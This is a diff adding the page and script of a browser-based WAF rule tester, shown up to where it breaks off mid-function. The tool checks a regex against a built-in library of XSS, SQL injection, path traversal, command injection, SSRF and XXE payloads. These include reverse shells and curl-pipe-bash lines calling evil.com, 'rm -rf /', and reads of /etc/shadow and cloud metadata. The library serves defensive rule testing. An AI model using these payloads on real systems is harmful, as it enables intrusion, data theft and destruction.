@@ -1,0 +1,789 @@
+---
+toolSlug: waf-rule-builder
+permalink: /tools/waf-rule-builder/
+---
+
+<div class="tool-group">
+  <label for="waf-rule-name">Rule name</label>
+  <input type="text" id="waf-rule-name" placeholder="e.g. block-sqli-union" spellcheck="false" autocomplete="off" value="custom-waf-rule">
+</div>
+
+<div class="tool-group">
+  <label for="waf-regex">Regex pattern</label>
+  <textarea id="waf-regex" rows="3" placeholder="(?i)(union\s+(all\s+)?select|select\s+.*\s+from\s+)" spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+  <div class="waf-regex-meta" id="waf-regex-meta"></div>
+</div>
+
+<div class="tool-row" style="flex-wrap:wrap;gap:0.5rem;">
+  <div class="tool-group" style="margin-bottom:0;flex:0 0 auto;">
+    <label for="waf-action" style="font-size:0.75rem;margin-bottom:2px;">Action</label>
+    <select id="waf-action">
+      <option value="block">Block</option>
+      <option value="log">Log</option>
+      <option value="challenge">Challenge</option>
+    </select>
+  </div>
+  <div style="display:flex;gap:0.5rem;align-items:flex-end;flex:1;">
+    <button class="btn btn--primary" id="waf-test-btn">Test Pattern</button>
+    <button class="btn" id="waf-example-btn">Try Example</button>
+    <button class="btn" id="waf-clear-btn">Clear</button>
+  </div>
+</div>
+
+<div id="waf-score" style="display:none;" class="waf-score-bar"></div>
+
+<div id="waf-results" style="display:none;">
+  <div class="waf-results-tabs" id="waf-tabs">
+    <button class="waf-tab waf-tab--active" data-tab="payloads">Payload Results</button>
+    <button class="waf-tab" data-tab="falsepos">False Positives</button>
+    <button class="waf-tab" data-tab="export">Export Rule</button>
+  </div>
+
+  <div id="waf-panel-payloads" class="waf-panel">
+    <div class="waf-category-filters" id="waf-cat-filters"></div>
+    <div id="waf-payload-list"></div>
+  </div>
+
+  <div id="waf-panel-falsepos" class="waf-panel" style="display:none;">
+    <div id="waf-fp-list"></div>
+  </div>
+
+  <div id="waf-panel-export" class="waf-panel" style="display:none;">
+    <div class="tool-group" style="margin-bottom:0.75rem;">
+      <label for="waf-export-format" style="font-size:0.75rem;margin-bottom:2px;">Export format</label>
+      <select id="waf-export-format">
+        <option value="cloudflare">Cloudflare WAF (wirefilter)</option>
+        <option value="aws">AWS WAF (JSON rule statement)</option>
+        <option value="modsecurity">ModSecurity (SecRule)</option>
+        <option value="nginx">nginx (location/if block)</option>
+        <option value="apache">Apache (.htaccess RewriteRule)</option>
+      </select>
+    </div>
+    <div class="waf-export-block" id="waf-export-block">
+      <div class="waf-export-header">
+        <span id="waf-export-label">Cloudflare WAF</span>
+        <button class="btn waf-copy-btn" id="waf-copy-btn">Copy</button>
+      </div>
+      <pre id="waf-export-code" class="waf-export-pre"></pre>
+    </div>
+  </div>
+</div>
+
+<div id="waf-empty" class="waf-empty-msg">Enter a regex pattern above and click "Test Pattern" to see results against 110+ attack payloads.</div>
+
+<hr style="margin:2rem 0;border:none;border-top:1px solid var(--border,#2a2a3a);">
+
+<div class="waf-info-note">
+  <strong>How it works</strong>
+  Your regex is tested entirely in-browser against a curated library of real-world attack payloads across 6 categories. Nothing is sent to any server. Export the rule in your WAF's native format and deploy directly.
+</div>
+
+<style>
+  .waf-regex-meta { font-size:0.75rem; color:var(--text-3,#888); margin-top:4px; }
+  .waf-regex-meta.waf-regex-error { color:#f87171; }
+
+  .waf-score-bar {
+    display:flex; align-items:center; gap:1rem; flex-wrap:wrap;
+    padding:0.875rem 1rem; margin-bottom:1rem;
+    background:var(--surface-1,#1a1a2e); border:1px solid var(--border,#2a2a3a); border-radius:8px;
+  }
+  .waf-score-main { font-size:1.1rem; font-weight:700; color:var(--text-1,#e2e8f0); }
+  .waf-score-breakdown { font-size:0.8125rem; color:var(--text-2,#94a3b8); }
+  .waf-score-meter { flex:1; min-width:120px; height:6px; background:var(--surface-0,#0f0f1a); border-radius:3px; overflow:hidden; }
+  .waf-score-fill { height:100%; border-radius:3px; transition:width 0.3s ease; }
+
+  .waf-results-tabs { display:flex; gap:0; border-bottom:1px solid var(--border,#2a2a3a); margin-bottom:1rem; }
+  .waf-tab {
+    padding:0.5rem 1rem; font-size:0.8125rem; font-weight:600;
+    background:none; border:none; border-bottom:2px solid transparent;
+    color:var(--text-3,#888); cursor:pointer; transition:color 0.15s, border-color 0.15s;
+  }
+  .waf-tab:hover { color:var(--text-1,#e2e8f0); }
+  .waf-tab--active { color:#818cf8; border-bottom-color:#818cf8; }
+
+  .waf-category-filters { display:flex; flex-wrap:wrap; gap:0.375rem; margin-bottom:0.75rem; }
+  .waf-cat-btn {
+    font-size:0.7rem; font-weight:600; padding:3px 8px; border-radius:4px;
+    border:1px solid var(--border,#2a2a3a); background:var(--surface-0,#0f0f1a);
+    color:var(--text-2,#94a3b8); cursor:pointer; transition:all 0.15s;
+    text-transform:uppercase; letter-spacing:0.04em;
+  }
+  .waf-cat-btn:hover { border-color:var(--text-3,#888); color:var(--text-1,#e2e8f0); }
+  .waf-cat-btn--active { background:#818cf8; border-color:#818cf8; color:#fff; }
+
+  .waf-payload-row {
+    display:flex; align-items:flex-start; gap:0.625rem;
+    padding:0.5rem 0.75rem; border-bottom:1px solid var(--border,#2a2a3a);
+    font-size:0.8125rem; line-height:1.45;
+  }
+  .waf-payload-row:last-child { border-bottom:none; }
+  .waf-payload-icon { flex-shrink:0; width:18px; text-align:center; font-weight:700; font-size:0.875rem; line-height:1.45; }
+  .waf-payload-icon--match { color:#4ade80; }
+  .waf-payload-icon--miss { color:#f87171; }
+  .waf-payload-icon--fp { color:#fbbf24; }
+  .waf-payload-icon--safe { color:#4ade80; }
+  .waf-payload-body { flex:1; min-width:0; }
+  .waf-payload-str {
+    font-family:var(--font-mono,monospace); font-size:0.75rem;
+    background:var(--surface-0,#0f0f1a); padding:2px 6px; border-radius:3px;
+    display:inline-block; max-width:100%; overflow-x:auto; white-space:nowrap;
+    color:var(--text-1,#e2e8f0); border:1px solid var(--border,#2a2a3a);
+  }
+  .waf-payload-desc { color:var(--text-3,#888); font-size:0.75rem; margin-top:2px; }
+  .waf-payload-cat {
+    flex-shrink:0; font-size:0.65rem; font-weight:700; padding:2px 6px;
+    border-radius:3px; text-transform:uppercase; letter-spacing:0.04em;
+    background:rgba(129,140,248,0.1); color:#a5b4fc; border:1px solid rgba(129,140,248,0.2);
+  }
+
+  .waf-export-block {
+    border:1px solid var(--border,#2a2a3a); border-radius:8px; overflow:hidden;
+  }
+  .waf-export-header {
+    display:flex; align-items:center; justify-content:space-between;
+    padding:0.5rem 0.75rem; background:var(--surface-1,#1a1a2e);
+    border-bottom:1px solid var(--border,#2a2a3a);
+  }
+  .waf-export-header span { font-size:0.8125rem; font-weight:600; color:var(--text-2,#94a3b8); }
+  .waf-copy-btn { font-size:0.75rem; padding:3px 10px; }
+  .waf-export-pre {
+    margin:0; padding:1rem; font-size:0.8rem; line-height:1.55;
+    font-family:var(--font-mono,monospace); background:var(--surface-0,#0f0f1a);
+    color:var(--text-1,#e2e8f0); white-space:pre-wrap; word-break:break-all;
+    max-height:400px; overflow-y:auto;
+  }
+
+  .waf-empty-msg { text-align:center; padding:2.5rem; color:var(--text-3,#888); font-size:0.9rem; }
+  .waf-info-note {
+    font-size:0.875rem; color:var(--text-2,#94a3b8); line-height:1.5;
+    padding:1rem 1.25rem; background:var(--surface-1,#1a1a2e);
+    border:1px solid var(--border,#2a2a3a); border-radius:8px;
+  }
+  .waf-info-note strong { color:var(--text-1,#e2e8f0); display:block; margin-bottom:0.25rem; }
+
+  .waf-section-heading {
+    font-size:0.75rem; font-weight:700; text-transform:uppercase; letter-spacing:0.06em;
+    color:var(--text-3,#888); padding:0.5rem 0.75rem; margin:0;
+    background:var(--surface-1,#1a1a2e); border-bottom:1px solid var(--border,#2a2a3a);
+    border-top:1px solid var(--border,#2a2a3a);
+  }
+  .waf-section-heading:first-child { border-top:none; }
+</style>
+
+<script>
+(function () {
+  /* ── Element refs ────────────────────────────────────────── */
+  var regexEl    = document.getElementById('waf-regex');
+  var ruleNameEl = document.getElementById('waf-rule-name');
+  var actionEl   = document.getElementById('waf-action');
+  var testBtn    = document.getElementById('waf-test-btn');
+  var exampleBtn = document.getElementById('waf-example-btn');
+  var clearBtn   = document.getElementById('waf-clear-btn');
+  var metaEl     = document.getElementById('waf-regex-meta');
+  var scoreEl    = document.getElementById('waf-score');
+  var resultsEl  = document.getElementById('waf-results');
+  var emptyEl    = document.getElementById('waf-empty');
+  var tabsEl     = document.getElementById('waf-tabs');
+  var catFilters = document.getElementById('waf-cat-filters');
+  var payloadList= document.getElementById('waf-payload-list');
+  var fpList     = document.getElementById('waf-fp-list');
+  var exportFmt  = document.getElementById('waf-export-format');
+  var exportCode = document.getElementById('waf-export-code');
+  var exportLabel= document.getElementById('waf-export-label');
+  var copyBtn    = document.getElementById('waf-copy-btn');
+
+  /* ── Payload library ─────────────────────────────────────── */
+  var PAYLOADS = [
+    // ── XSS (32 payloads) ──
+    { cat:'XSS', str:'<script>alert(1)</script>', desc:'Basic script injection' },
+    { cat:'XSS', str:'<img src=x onerror=alert(1)>', desc:'Event handler injection via img tag' },
+    { cat:'XSS', str:'<svg onload=alert(1)>', desc:'SVG onload event' },
+    { cat:'XSS', str:'<body onload=alert(1)>', desc:'Body onload event' },
+    { cat:'XSS', str:'<iframe src="javascript:alert(1)">', desc:'JavaScript protocol in iframe' },
+    { cat:'XSS', str:'<a href="javascript:alert(1)">click</a>', desc:'JavaScript protocol in anchor' },
+    { cat:'XSS', str:'"><script>alert(String.fromCharCode(88,83,83))</script>', desc:'Attribute breakout with script' },
+    { cat:'XSS', str:"'><script>alert(document.cookie)</script>", desc:'Single-quote attribute breakout' },
+    { cat:'XSS', str:'<div style="background:url(javascript:alert(1))">', desc:'CSS expression injection' },
+    { cat:'XSS', str:'<input onfocus=alert(1) autofocus>', desc:'Autofocus onfocus event' },
+    { cat:'XSS', str:'<details open ontoggle=alert(1)>', desc:'Details ontoggle event' },
+    { cat:'XSS', str:'<marquee onstart=alert(1)>', desc:'Marquee onstart event' },
+    { cat:'XSS', str:'<video><source onerror="alert(1)">', desc:'Video source error event' },
+    { cat:'XSS', str:'<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">', desc:'Nested tag confusion' },
+    { cat:'XSS', str:'%3Cscript%3Ealert(1)%3C/script%3E', desc:'URL-encoded script tag' },
+    { cat:'XSS', str:'&#60;script&#62;alert(1)&#60;/script&#62;', desc:'HTML entity encoded script' },
+    { cat:'XSS', str:'<scr<script>ipt>alert(1)</scr</script>ipt>', desc:'Nested tag bypass attempt' },
+    { cat:'XSS', str:'<SCRIPT SRC=https://evil.com/xss.js></SCRIPT>', desc:'Remote script include (uppercase)' },
+    { cat:'XSS', str:'<img """><script>alert(1)</script>">', desc:'Malformed attribute confusion' },
+    { cat:'XSS', str:'<svg/onload=alert(1)>', desc:'SVG onload without space' },
+    { cat:'XSS', str:"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>", desc:'Polyglot XSS payload' },
+    { cat:'XSS', str:'<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">', desc:'HTML entity encoded event handler' },
+    { cat:'XSS', str:'<svg><animate onbegin=alert(1) attributeName=x dur=1s>', desc:'SVG animate onbegin' },
+    { cat:'XSS', str:'<object data="data:text/html,<script>alert(1)</script>">', desc:'Data URI in object tag' },
+    { cat:'XSS', str:'<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">', desc:'Base64 data URI in embed' },
+    { cat:'XSS', str:'\'-alert(1)-\'', desc:'Template literal injection' },
+    { cat:'XSS', str:'${alert(1)}', desc:'ES6 template expression injection' },
+    { cat:'XSS', str:'<x contenteditable onblur=alert(1)>lose focus</x>', desc:'Contenteditable onblur' },
+    { cat:'XSS', str:'<form><button formaction=javascript:alert(1)>X</button>', desc:'Form button formaction' },
+    { cat:'XSS', str:'<isindex action=javascript:alert(1) type=image>', desc:'Isindex action handler' },
+    { cat:'XSS', str:'<link rel=import href="https://evil.com/xss.html">', desc:'HTML import (deprecated)' },
+    { cat:'XSS', str:'<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>click</a>', desc:'Base tag href manipulation' },
+
+    // ── SQLi (32 payloads) ──
+    { cat:'SQLi', str:"' OR '1'='1", desc:'Classic OR tautology' },
+    { cat:'SQLi', str:"' OR 1=1--", desc:'Tautology with comment' },
+    { cat:'SQLi', str:"' OR 1=1#", desc:'Tautology with hash comment' },
+    { cat:'SQLi', str:"' UNION SELECT NULL,NULL,NULL--", desc:'UNION-based NULL probe' },
+    { cat:'SQLi', str:"' UNION ALL SELECT username,password FROM users--", desc:'UNION credential extraction' },
+    { cat:'SQLi', str:"1; DROP TABLE users--", desc:'Stacked query table drop' },
+    { cat:'SQLi', str:"1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", desc:'Error-based info extraction (MSSQL)' },
+    { cat:'SQLi', str:"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", desc:'Time-based blind (MySQL)' },
+    { cat:'SQLi', str:"'; WAITFOR DELAY '0:0:5'--", desc:'Time-based blind (MSSQL)' },
+    { cat:'SQLi', str:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--", desc:'Extractvalue error-based (MySQL)' },
+    { cat:'SQLi', str:"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--", desc:'UpdateXML error-based (MySQL)' },
+    { cat:'SQLi', str:"admin'--", desc:'Comment-based auth bypass' },
+    { cat:'SQLi', str:"' OR ''='", desc:'Empty string tautology' },
+    { cat:'SQLi', str:"1' ORDER BY 10--", desc:'Column count enumeration' },
+    { cat:'SQLi', str:"1' GROUP BY 1,2,3--", desc:'GROUP BY enumeration' },
+    { cat:'SQLi', str:"-1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--", desc:'Schema enumeration (MySQL)' },
+    { cat:'SQLi', str:"' AND 1=(SELECT COUNT(*) FROM tabname); --", desc:'Subquery injection' },
+    { cat:'SQLi', str:"1;EXEC xp_cmdshell('whoami')--", desc:'xp_cmdshell command execution (MSSQL)' },
+    { cat:'SQLi', str:"' HAVING 1=1--", desc:'HAVING clause injection' },
+    { cat:'SQLi', str:"1' AND benchmark(10000000,SHA1('test'))--", desc:'Benchmark-based blind (MySQL)' },
+    { cat:'SQLi', str:"' AND pg_sleep(5)--", desc:'Time-based blind (PostgreSQL)' },
+    { cat:'SQLi', str:"') OR ('1'='1", desc:'Parenthetical tautology' },
+    { cat:'SQLi', str:"1%27%20OR%201%3D1--", desc:'URL-encoded OR injection' },
+    { cat:'SQLi', str:"' UNION SELECT LOAD_FILE('/etc/passwd')--", desc:'File read via LOAD_FILE (MySQL)' },
+    { cat:'SQLi', str:"' INTO OUTFILE '/tmp/shell.php'--", desc:'File write via INTO OUTFILE' },
+    { cat:'SQLi', str:"1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", desc:'Error-based double query (MySQL)' },
+    { cat:'SQLi', str:"';SHUTDOWN--", desc:'Database shutdown attempt' },
+    { cat:'SQLi', str:"' UNION SELECT null,@@version--", desc:'Version detection via UNION' },
+    { cat:'SQLi', str:"0x31206f72203127", desc:'Hex-encoded injection' },
+    { cat:'SQLi', str:"char(39,32,79,82,32,39,49,39,61,39,49)", desc:'CHAR() function bypass' },
+    { cat:'SQLi', str:"' AnD sLeEp(5)--", desc:'Mixed case evasion' },
+    { cat:'SQLi', str:"'/**/OR/**/1=1--", desc:'Comment whitespace bypass' },
+
+    // ── Path Traversal (18 payloads) ──
+    { cat:'Path Traversal', str:'../../../etc/passwd', desc:'Basic relative path traversal' },
+    { cat:'Path Traversal', str:'..\\..\\..\\windows\\system32\\config\\sam', desc:'Windows backslash traversal' },
+    { cat:'Path Traversal', str:'....//....//....//etc/passwd', desc:'Double encoding traversal' },
+    { cat:'Path Traversal', str:'..%252f..%252f..%252fetc/passwd', desc:'Double URL-encoded traversal' },
+    { cat:'Path Traversal', str:'%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', desc:'URL-encoded dot-slash traversal' },
+    { cat:'Path Traversal', str:'..%c0%af..%c0%af..%c0%afetc/passwd', desc:'UTF-8 overlong encoding traversal' },
+    { cat:'Path Traversal', str:'..%255c..%255c..%255cwindows%255csystem.ini', desc:'Double-encoded backslash (IIS)' },
+    { cat:'Path Traversal', str:'/etc/shadow', desc:'Direct absolute path to shadow file' },
+    { cat:'Path Traversal', str:'/proc/self/environ', desc:'Linux proc environment' },
+    { cat:'Path Traversal', str:'....\\....\\....\\etc\\passwd', desc:'Mixed double-dot backslash' },
+    { cat:'Path Traversal', str:'..0x2f..0x2f..0x2fetc/passwd', desc:'Hex-encoded slash traversal' },
+    { cat:'Path Traversal', str:'/var/log/apache2/access.log', desc:'Direct log file access' },
+    { cat:'Path Traversal', str:'php://filter/convert.base64-encode/resource=index.php', desc:'PHP filter wrapper (LFI)' },
+    { cat:'Path Traversal', str:'/etc/nginx/nginx.conf', desc:'Config file direct access' },
+    { cat:'Path Traversal', str:'..%00/etc/passwd', desc:'Null byte path truncation' },
+    { cat:'Path Traversal', str:'file:///etc/passwd', desc:'File protocol handler' },
+    { cat:'Path Traversal', str:'WEB-INF/web.xml', desc:'Java webapp config access' },
+    { cat:'Path Traversal', str:'.htaccess', desc:'Apache config access' },
+
+    // ── Command Injection (18 payloads) ──
+    { cat:'Cmd Injection', str:'; ls -la', desc:'Semicolon command chaining' },
+    { cat:'Cmd Injection', str:'| cat /etc/passwd', desc:'Pipe to read passwd' },
+    { cat:'Cmd Injection', str:'`whoami`', desc:'Backtick command substitution' },
+    { cat:'Cmd Injection', str:'$(id)', desc:'Dollar-paren command substitution' },
+    { cat:'Cmd Injection', str:'& net user', desc:'Ampersand command chaining (Windows)' },
+    { cat:'Cmd Injection', str:'|| ping -c 3 evil.com', desc:'OR operator chaining' },
+    { cat:'Cmd Injection', str:'; curl https://evil.com/shell.sh | bash', desc:'Remote script download and execute' },
+    { cat:'Cmd Injection', str:'$(curl https://evil.com/payload)', desc:'Inline remote fetch' },
+    { cat:'Cmd Injection', str:'`wget https://evil.com/backdoor -O /tmp/bd`', desc:'Backtick wget backdoor' },
+    { cat:'Cmd Injection', str:'; nc -e /bin/sh evil.com 4444', desc:'Netcat reverse shell' },
+    { cat:'Cmd Injection', str:'| bash -i >& /dev/tcp/evil.com/4444 0>&1', desc:'Bash reverse shell' },
+    { cat:'Cmd Injection', str:'%0als%20-la', desc:'Newline-encoded command injection' },
+    { cat:'Cmd Injection', str:'\nwhoami\n', desc:'Newline injection' },
+    { cat:'Cmd Injection', str:'; rm -rf /', desc:'Destructive delete attempt' },
+    { cat:'Cmd Injection', str:'| sleep 10', desc:'Sleep-based blind injection' },
+    { cat:'Cmd Injection', str:'$(sleep${IFS}10)', desc:'IFS variable space bypass' },
+    { cat:'Cmd Injection', str:'{cat,/etc/passwd}', desc:'Brace expansion bypass' },
+    { cat:'Cmd Injection', str:'a]b;id', desc:'Bracket breakout injection' },
+
+    // ── SSRF (12 payloads) ──
+    { cat:'SSRF', str:'http://169.254.169.254/latest/meta-data/', desc:'AWS metadata endpoint' },
+    { cat:'SSRF', str:'http://metadata.google.internal/computeMetadata/v1/', desc:'GCP metadata endpoint' },
+    { cat:'SSRF', str:'http://169.254.169.254/metadata/v1/', desc:'DigitalOcean metadata' },
+    { cat:'SSRF', str:'http://127.0.0.1:22/', desc:'Localhost port scan (SSH)' },
+    { cat:'SSRF', str:'http://localhost/admin', desc:'Localhost admin panel' },
+    { cat:'SSRF', str:'http://0.0.0.0/', desc:'All-interfaces bind address' },
+    { cat:'SSRF', str:'http://[::1]/', desc:'IPv6 loopback' },
+    { cat:'SSRF', str:'http://0x7f000001/', desc:'Hex-encoded 127.0.0.1' },
+    { cat:'SSRF', str:'http://2130706433/', desc:'Decimal-encoded 127.0.0.1' },
+    { cat:'SSRF', str:'gopher://127.0.0.1:25/xHELO', desc:'Gopher protocol SSRF' },
+    { cat:'SSRF', str:'dict://evil.com:1337/info', desc:'Dict protocol SSRF' },
+    { cat:'SSRF', str:'http://169.254.169.254/latest/api/token', desc:'AWS IMDSv2 token endpoint' },
+
+    // ── XXE (12 payloads) ──
+    { cat:'XXE', str:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', desc:'Basic XXE file read' },
+    { cat:'XXE', str:'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>', desc:'External DTD via HTTP' },
+    { cat:'XXE', str:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>', desc:'Parameter entity XXE' },
+    { cat:'XXE', str:'<!ENTITY xxe SYSTEM "expect://id">', desc:'Expect protocol RCE' },
+    { cat:'XXE', str:'<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">', desc:'PHP filter in XXE' },
+    { cat:'XXE', str:'<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]>', desc:'Denial of service via /dev/random' },
+    { cat:'XXE', str:'<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>', desc:'Billion laughs DoS' },
+    { cat:'XXE', str:'<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/shadow">]>', desc:'Shadow file XXE read' },
+    { cat:'XXE', str:'<!DOCTYPE data [<!ENTITY file SYSTEM "file:///proc/self/cmdline">]><data>&file;</data>', desc:'Process cmdline XXE' },
+    { cat:'XXE', str:'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]>', desc:'Netdoc protocol XXE (Java)' },
+    { cat:'XXE', str:'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:https://evil.com/evil.jar!/evil.dtd">]>', desc:'JAR protocol XXE (Java)' },
+    { cat:'XXE', str:'<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>', desc:'XInclude file read' }
+  ];
+
+  /* ── False positive (benign) test strings ─────────────────── */
+  var BENIGN = [
+    { str:'search for "blue shoes" in catalog', desc:'Normal search query' },
+    { str:'user@example.com', desc:'Standard email address' },
+    { str:'SELECT a gift for your friend', desc:'English sentence with SQL keyword' },
+    { str:'The band played <encore>', desc:'Angle brackets in natural text' },
+    { str:'/images/photo-2024.jpg', desc:'Normal image file path' },
+    { str:'Price: $19.99 (or 15.99 EUR)', desc:'Price with special characters' },
+    { str:'{"name":"John","age":30,"active":true}', desc:'Normal JSON body' },
+    { str:'file=report_2024_Q1.pdf', desc:'Normal file parameter' },
+    { str:'Content-Type: application/json', desc:'Standard HTTP header' },
+    { str:'background-color: rgba(255, 128, 0, 0.5);', desc:'CSS property value' },
+    { str:'I selected the union of sets A and B', desc:'English with "union" and "select"' },
+    { str:'C:\\Users\\john\\Documents\\resume.docx', desc:'Windows file path' },
+    { str:'O\'Brien ordered a "grande latte"', desc:'Name with apostrophe and quotes' },
+    { str:'DROP-down menu is not working', desc:'Bug report with "drop"' },
+    { str:'She said: "Let\'s sleep on it"', desc:'Natural language with "sleep"' },
+    { str:'UPDATE your profile picture', desc:'UI text with SQL keyword' },
+    { str:'path=/api/v2/users?limit=50&offset=10', desc:'Normal API path with params' },
+    { str:'exec summary: Q4 results exceeded targets', desc:'Business text with "exec"' },
+    { str:'The script ran for 3 hours', desc:'Text mentioning "script"' },
+    { str:'<b>Bold text</b> is allowed here', desc:'Allowed HTML formatting tag' },
+    { str:'Contact us at 1-800-555-0123', desc:'Phone number' },
+    { str:'https://cdn.example.com/assets/logo.png', desc:'Normal external URL' },
+    { str:'data-id="widget-42" class="btn"', desc:'Normal HTML attributes' },
+    { str:'The table shows quarterly revenue', desc:'English with "table"' },
+    { str:'SELECT ALL that apply from the list', desc:'Survey instruction text' }
+  ];
+
+  var CATEGORIES = ['XSS','SQLi','Path Traversal','Cmd Injection','SSRF','XXE'];
+
+  /* ── State ────────────────────────────────────────────────── */
+  var lastResults = null;
+  var activeFilter = 'all';
+
+  /* ── Regex compilation ───────────────────────────────────── */
+  function compileRegex(src) {
+    if (!src.trim()) return { re:null, error:'Empty pattern' };
+    try {
+      var re = new RegExp(src, 'gi');
+      return { re:re, error:null };
+    } catch(e) {
+      return { re:null, error:e.message };
+    }
+  }
+
+  /* ── Validate regex on input ─────────────────────────────── */
+  regexEl.addEventListener('input', function () {
+    var src = regexEl.value;
+    if (!src.trim()) { metaEl.textContent = ''; metaEl.className = 'waf-regex-meta'; return; }
+    var c = compileRegex(src);
+    if (c.error) {
+      metaEl.textContent = 'Invalid regex: ' + c.error;
+      metaEl.className = 'waf-regex-meta waf-regex-error';
+    } else {
+      metaEl.textContent = 'Valid pattern — flags: g, i (case-insensitive)';
+      metaEl.className = 'waf-regex-meta';
+    }
+  });
+
+  /* ── Test engine ─────────────────────────────────────────── */
+  function runTest() {
+    var src = regexEl.value;
+    if (!src.trim()) { metaEl.textContent = 'Enter a regex pattern first.'; metaEl.className = 'waf-regex-meta waf-regex-error'; return; }
+    var c = compileRegex(src);
+    if (c.error) { metaEl.textContent = 'Invalid regex: ' + c.error; metaEl.className = 'waf-regex-meta waf-regex-error'; return; }
+
+    var payloadResults = PAYLOADS.map(function (p) {
+      var re = new RegExp(src, 'gi');
+      var match = re.test(p.str);
+      return { cat:p.cat, str:p.str, desc:p.desc, match:match };
+    });
+
+    var fpResults = BENIGN.map(function (b) {
+      var re = new RegExp(src, 'gi');
+      var match = re.test(b.str);
+      return { str:b.str, desc:b.desc, match:match };
+    });
+
+    var totalMatch = payloadResults.filter(function(r){ return r.match; }).length;
+    var totalPayloads = payloadResults.length;
+    var fpCount = fpResults.filter(function(r){ return r.match; }).length;
+
+    // Per-category breakdown
+    var catBreakdown = {};
+    CATEGORIES.forEach(function (cat) {
+      var items = payloadResults.filter(function(r){ return r.cat === cat; });
+      var matches = items.filter(function(r){ return r.match; }).length;
+      catBreakdown[cat] = { matches:matches, total:items.length };
+    });
+
+    lastResults = {
+      payloads: payloadResults,
+      falsePos: fpResults,
+      totalMatch: totalMatch,
+      totalPayloads: totalPayloads,
+      fpCount: fpCount,
+      catBreakdown: catBreakdown
+    };
+
+    renderScore();
+    renderPayloads();
+    renderFalsePos();
+    renderExport();
+
+    emptyEl.style.display = 'none';
+    scoreEl.style.display = '';
+    resultsEl.style.display = '';
+  }
+
+  /* ── Render: coverage score ──────────────────────────────── */
+  function renderScore() {
+    var r = lastResults;
+    var pct = Math.round((r.totalMatch / r.totalPayloads) * 100);
+
+    var color = pct >= 80 ? '#4ade80' : pct >= 50 ? '#fbbf24' : '#f87171';
+
+    var breakdown = CATEGORIES.map(function (cat) {
+      var c = r.catBreakdown[cat];
+      return cat + ' ' + c.matches + '/' + c.total;
+    }).join(' · ');
+
+    var fpColor = r.fpCount === 0 ? '#4ade80' : r.fpCount <= 2 ? '#fbbf24' : '#f87171';
+    var fpText = r.fpCount === 0 ? 'No false positives' : r.fpCount + ' false positive' + (r.fpCount !== 1 ? 's' : '');
+
+    scoreEl.innerHTML = '<div class="waf-score-main" style="color:' + color + '">' + r.totalMatch + ' of ' + r.totalPayloads + ' payloads caught (' + pct + '%)</div>' +
+      '<div class="waf-score-meter"><div class="waf-score-fill" style="width:' + pct + '%;background:' + color + '"></div></div>' +
+      '<div class="waf-score-breakdown">' + breakdown + '</div>' +
+      '<div class="waf-score-main" style="font-size:0.875rem;color:' + fpColor + '">' + fpText + '</div>';
+  }
+
+  /* ── Render: payload list ────────────────────────────────── */
+  function renderPayloads() {
+    var r = lastResults;
+    var filtered = activeFilter === 'all' ? r.payloads : r.payloads.filter(function(p){ return p.cat === activeFilter; });
+
+    // Category filter buttons
+    var matchCount = function(cat) {
+      var items = r.payloads.filter(function(p){ return p.cat === cat; });
+      return items.filter(function(p){ return p.match; }).length + '/' + items.length;
+    };
+    var html = '<button class="waf-cat-btn' + (activeFilter === 'all' ? ' waf-cat-btn--active' : '') + '" data-cat="all">All ' + r.totalMatch + '/' + r.totalPayloads + '</button>';
+    CATEGORIES.forEach(function(cat) {
+      html += '<button class="waf-cat-btn' + (activeFilter === cat ? ' waf-cat-btn--active' : '') + '" data-cat="' + cat + '">' + cat + ' ' + matchCount(cat) + '</button>';
+    });
+    catFilters.innerHTML = html;
+
+    // Payload rows
+    var rows = '';
+    filtered.forEach(function(p) {
+      var icon = p.match ?
+        '<div class="waf-payload-icon waf-payload-icon--match">&#10003;</div>' :
+        '<div class="waf-payload-icon waf-payload-icon--miss">&#10007;</div>';
+      rows += '<div class="waf-payload-row">' + icon +
+        '<div class="waf-payload-body"><span class="waf-payload-str">' + escHtml(p.str) + '</span>' +
+        '<div class="waf-payload-desc">' + escHtml(p.desc) + '</div></div>' +
+        '<span class="waf-payload-cat">' + escHtml(p.cat) + '</span></div>';
+    });
+    payloadList.innerHTML = rows || '<div class="waf-empty-msg">No payloads in this category.</div>';
+  }
+
+  /* ── Render: false positives ─────────────────────────────── */
+  function renderFalsePos() {
+    var r = lastResults;
+    var rows = '';
+    r.falsePos.forEach(function(f) {
+      var icon = f.match ?
+        '<div class="waf-payload-icon waf-payload-icon--fp">!</div>' :
+        '<div class="waf-payload-icon waf-payload-icon--safe">&#10003;</div>';
